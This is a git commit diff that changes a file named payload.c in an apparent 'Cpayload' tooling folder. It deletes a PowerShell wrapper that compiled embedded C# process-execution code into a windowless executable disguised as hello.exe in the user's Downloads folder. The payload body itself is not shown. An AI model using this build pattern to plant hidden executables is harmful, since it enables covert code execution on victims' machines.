34504f398af6c673b60aca4d667f6cd8db2d5ac4
43a1723 <hai1723notgay@gmail.com>
2024-09-02 15:37:12 +0700

    Update payload.c

--- Extras/Cpayload/payload.c
+++ Extras/Cpayload/payload.c
@@ -1,4 +1,3 @@
-$source  = @" 
 using System;
 using System.Diagnostics;
 
@@ -35,19 +34,3 @@ namespace PowerShellExecution
         }
     }
 }
-"@
-$outpath  =  "$env:userprofile\downloads\hello.exe" 
-$dict = new-object 'System.Collections.Generic.Dictionary[string,string]' 
-$dict.Add('CompilerVersion','v4.0')
-$CsharpCompiler = New-Object Microsoft.CSharp.CSharpCodeProvider $dict
-$CompilerParametres = New-Object System.CodeDom.Compiler.CompilerParameters
-$CompilerParametres.ReferencedAssemblies.Add("System.dll")
-$CompilerParametres.ReferencedAssemblies.Add("System.Windows.Forms.dll")
-$CompilerParametres.IncludeDebugInformation = $false
-$CompilerParametres.GenerateExecutable = $true
-$CompilerParametres.GenerateInMemory = $false
-$CompilerParametres.OutputAssembly  =  $outpath 
-$CompilerParametres.CompilerOptions += "/platform:X86 /unsafe /target:winexe"
-$result = $CsharpCompiler.CompileAssemblyFromSource($CompilerParametres, $source) 
-$result  
- 
